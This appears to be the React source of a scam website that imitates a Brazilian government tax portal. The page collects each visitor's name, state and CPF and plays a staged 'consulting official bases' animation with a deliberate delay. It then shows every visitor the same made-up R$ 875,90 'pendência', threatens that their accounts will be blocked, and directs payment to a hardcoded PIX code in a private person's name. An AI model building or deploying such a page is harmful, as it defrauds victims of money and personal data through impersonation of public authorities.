import { useState } from "react";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { PaymentTimer } from "@/components/PaymentTimer";
import { useCreateConsultation } from "@/hooks/use-consultations";
import { useToast } from "@/hooks/use-toast";
import { motion, AnimatePresence } from "framer-motion";
import { Copy, Check, ChevronRight, AlertTriangle, ShieldCheck } from "lucide-react";
import InputMask from "react-input-mask";

const STATES = [
  "AC", "AL", "AP", "AM", "BA", "CE", "DF", "ES", "GO", "MA", "MT", "MS", "MG", 
  "PA", "PB", "PR", "PE", "PI", "RJ", "RN", "RS", "RO", "RR", "SC", "SP", "SE", "TO"
];

const INSTALLMENTS = [
  { label: "1x de R$ 875,90", value: 875.90 },
  { label: "2x de R$ 437,95", value: 437.95 },
  { label: "3x de R$ 291,98", value: 291.98 },
  { label: "4x de R$ 218,97", value: 218.97 },
  { label: "5x de R$ 175,18", value: 175.18 },
];

const PIX_CODE = "00020126580014BR.GOV.BCB.PIX0136f3e23246-6efe-426b-ade1-f62fbbb9017b5204000053039865406835.905802BR5918Lucas Vilar Araujo6009SAO PAULO62140510BrKNT8ufWx6304E206";

type Step = 'landing' | 'form' | 'processing' | 'result' | 'installments' | 'payment';

export default function Home() {
  const [step, setStep] = useState<Step>('landing');
  const [formData, setFormData] = useState({ fullName: "", state: "", cpf: "" });
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();
  const createConsultation = useCreateConsultation();

  const handleConsultClick = () => setStep('form');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic validation
    if (!formData.fullName || !formData.state || !formData.cpf) {
      toast({
        title: "Campos obrigatórios",
        description: "Por favor, preencha todos os campos para continuar.",
        variant: "destructive"
      });
      return;
    }

    try {
      setStep('processing');
      
      // Submit to backend
      await createConsultation.mutateAsync(formData);
      
      // Simulate processing delay for effect
      setTimeout(() => {
        setStep('result');
      }, 2000);
      
    } catch (error) {
      setStep('form');
      toast({
        title: "Erro ao consultar",
        description: "Ocorreu um erro ao processar sua solicitação. Tente novamente.",
        variant: "destructive"
      });
    }
  };

  const handleCopyPix = () => {
    navigator.clipboard.writeText(PIX_CODE);
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "Cole o código no seu aplicativo do banco para pagar.",
    });
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5]">
      <Header />
      <main className="flex-grow pt-[100px] pb-12 px-4">
        <div className="max-w-4xl mx-auto">
          
          {/* Header Section */}
          <div className="text-center mb-10">
            <h1 className="text-2xl md:text-3xl font-bold text-[#0C326F] mb-2 uppercase tracking-tight">
              Regularização de Obrigações Fiscais e Emissão de Guias Oficiais
            </h1>
            <p className="text-lg text-gray-600 font-medium">
              Atendimento privado para cumprimento de prazos legais
            </p>
          </div>

          <AnimatePresence mode="wait">
            {/* Step 1: Landing Content */}
            {step === 'landing' && (
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="space-y-8"
              >
                <div className="bg-white rounded-xl shadow-md p-8 border-l-4 border-[#1351B4]">
                  <p className="text-gray-700 leading-relaxed mb-6">
                    Este portal oferece serviços privados de assessoria administrativa e fiscal voltados a apoiar pessoas físicas e jurídicas no cumprimento de obrigações tributárias. Nosso objetivo é facilitar a regularização de pendências, emitir guias oficiais e garantir que você esteja em dia com o fisco de forma rápida e segura.
                  </p>
                  
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 flex gap-3">
                    <AlertTriangle className="text-yellow-600 w-6 h-6 flex-shrink-0 mt-1" />
                    <div>
                      <h4 className="font-bold text-yellow-800 text-sm uppercase mb-1">Atenção aos Prazos</h4>
                      <p className="text-sm text-yellow-700">
                        Prazos legais e obrigações tributárias devem ser rigorosamente cumpridos. O descumprimento pode resultar em penalidades, multas e restrições ao seu CPF/CNPJ.
                      </p>
                    </div>
                  </div>

                  <p className="text-xs text-gray-500 italic border-t pt-4">Este site é um serviço privado, com vínculo com prefeituras, secretarias, Congresso Nacional , Supremo Tribunal Federal (STF) ou outros órgãos públicos. Atuamos como facilitadores no processo burocrático.</p>
                </div>

                <div className="flex justify-center">
                  <button 
                    onClick={handleConsultClick}
                    className="btn-primary px-12 py-4 text-xl flex items-center gap-2 shadow-blue-900/20"
                  >
                    Consultar
                    <ChevronRight className="w-5 h-5" />
                  </button>
                </div>
              </motion.div>
            )}

            {/* Step 2: Form */}
            {step === 'form' && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="max-w-xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden"
              >
                <div className="bg-[#0C326F] p-4 text-white text-center font-bold uppercase tracking-wider">
                  Dados para Consulta
                </div>
                <div className="p-8">
                  <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2">Nome Completo</label>
                      <input 
                        type="text" 
                        required
                        className="input-field"
                        placeholder="Digite seu nome completo"
                        value={formData.fullName}
                        onChange={e => setFormData({...formData, fullName: e.target.value})}
                      />
                    </div>
                    
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2">Estado (UF)</label>
                      <select 
                        required
                        className="input-field bg-white"
                        value={formData.state}
                        onChange={e => setFormData({...formData, state: e.target.value})}
                      >
                        <option value="">Selecione seu estado</option>
                        {STATES.map(st => (
                          <option key={st} value={st}>{st}</option>
                        ))}
                      </select>
                    </div>
                    
                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2">CPF</label>
                      <InputMask
                        mask="999.999.999-99"
                        className="input-field"
                        placeholder="000.000.000-00"
                        required
                        value={formData.cpf}
                        onChange={e => setFormData({...formData, cpf: e.target.value})}
                      />
                    </div>

                    <div className="pt-4">
                      <button 
                        type="submit"
                        disabled={createConsultation.isPending}
                        className="btn-primary w-full py-4 text-lg"
                      >
                        {createConsultation.isPending ? "Processando..." : "CONSULTAR"}
                      </button>
                    </div>
                  </form>
                </div>
              </motion.div>
            )}

            {/* Step 2.5: Processing Animation */}
            {step === 'processing' && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="flex flex-col items-center justify-center py-20"
              >
                <div className="w-16 h-16 border-4 border-[#0C326F] border-t-transparent rounded-full animate-spin mb-6"></div>
                <h3 className="text-xl font-bold text-[#0C326F]">Analisando dados...</h3>
                <p className="text-gray-500 mt-2">Consultando bases oficiais</p>
              </motion.div>
            )}

            {/* Step 3: Result */}
            {step === 'result' && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="max-w-2xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden border border-gray-200"
              >
                <div className="bg-red-600 p-4 text-white text-center font-bold uppercase flex items-center justify-center gap-2">
                  <AlertTriangle className="w-5 h-5" />
                  Pendência Identificada
                </div>
                <div className="p-8 text-center space-y-6">
                  <div className="bg-gray-50 p-6 rounded-lg border border-gray-200 text-left">
                    <p className="text-gray-800 leading-relaxed text-lg">
                      Após a verificação das informações fornecidas para o CPF <strong>{formData.cpf}</strong>, informamos que há uma taxa administrativa no valor de <strong className="text-[#0C326F]">R$ 875,90</strong>, correspondente aos serviços especializados de análise, validação de dados e encaminhamento do processo de regularização.
                    </p>
                    <p className="mt-4 text-red-600 font-bold">
                      Caso contrário será descontado do seu CPF e poderá haver bloqueio de contas.
                    </p>
                  </div>
                  
                  <div className="pt-4">
                    <button 
                      onClick={() => setStep('installments')}
                      className="btn-primary w-full max-w-sm mx-auto py-4 text-lg"
                    >
                      PARCELAR PIX
                    </button>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step 4: Installments */}
            {step === 'installments' && (
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="max-w-md mx-auto"
              >
                <div className="bg-white rounded-xl shadow-lg overflow-hidden">
                  <div className="bg-[#0C326F] p-4 text-white text-center font-bold uppercase">
                    Escolha o Parcelamento
                  </div>
                  <div className="p-6 space-y-3">
                    {INSTALLMENTS.map((inst, idx) => (
                      <button
                        key={idx}
                        onClick={() => setStep('payment')}
                        className="w-full text-left p-4 rounded-lg border border-gray-200 hover:border-[#1351B4] hover:bg-blue-50 transition-all flex justify-between items-center group"
                      >
                        <span className="font-medium text-gray-700 group-hover:text-[#0C326F]">{inst.label}</span>
                        <ChevronRight className="w-4 h-4 text-gray-400 group-hover:text-[#0C326F]" />
                      </button>
                    ))}
                    
                    <button 
                      onClick={() => setStep('payment')}
                      className="btn-primary w-full py-4 text-lg mt-6"
                    >
                      PAGAR AGORA
                    </button>
                  </div>
                </div>
              </motion.div>
            )}

            {/* Step 5: Payment (QR Code) */}
            {step === 'payment' && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="max-w-md mx-auto"
              >
                <div className="bg-white rounded-xl shadow-lg overflow-hidden border border-gray-200">
                  <div className="bg-[#0C326F] p-4 text-white text-center font-bold uppercase">
                    Pagamento via PIX
                  </div>
                  
                  <div className="p-8 flex flex-col items-center">
                    <p className="text-gray-600 text-sm mb-4 text-center">
                      Escaneie o QR Code abaixo ou copie o código para finalizar o pagamento.
                    </p>

                    <PaymentTimer />

                    <div className="bg-white p-2 border-2 border-gray-100 rounded-lg shadow-sm mb-6">
                      <img 
                        src="/qrcode.png" 
                        alt="QR Code Pix" 
                        className="w-64 h-64 object-contain"
                      />
                    </div>

                    <div className="w-full bg-gray-50 p-4 rounded-lg border border-gray-200 mb-6">
                      <p className="text-xs text-gray-500 mb-2 uppercase font-bold text-center">Código Pix Copia e Cola</p>
                      <div className="break-all font-mono text-xs text-gray-600 bg-white p-2 rounded border border-gray-200 h-20 overflow-y-auto mb-3 flex items-center justify-center">
                        <span className="text-gray-400">••••••••••••••••••••••••••••••••••••••••••••••••</span>
                      </div>
                      <button 
                        onClick={handleCopyPix}
                        className={`w-full py-2 rounded font-bold text-sm flex items-center justify-center gap-2 transition-colors ${copied ? 'bg-green-600 text-white' : 'bg-[#1351B4] text-white hover:bg-blue-700'}`}
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                        {copied ? "COPIADO!" : "COPIAR CÓDIGO"}
                      </button>
                    </div>

                    <div className="flex items-center gap-2 text-green-700 bg-green-50 px-4 py-2 rounded-full text-sm font-bold">
                      <ShieldCheck className="w-5 h-5" />
                      Ambiente Seguro
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

          </AnimatePresence>

        </div>
      </main>
      <Footer />
    </div>
  );
}
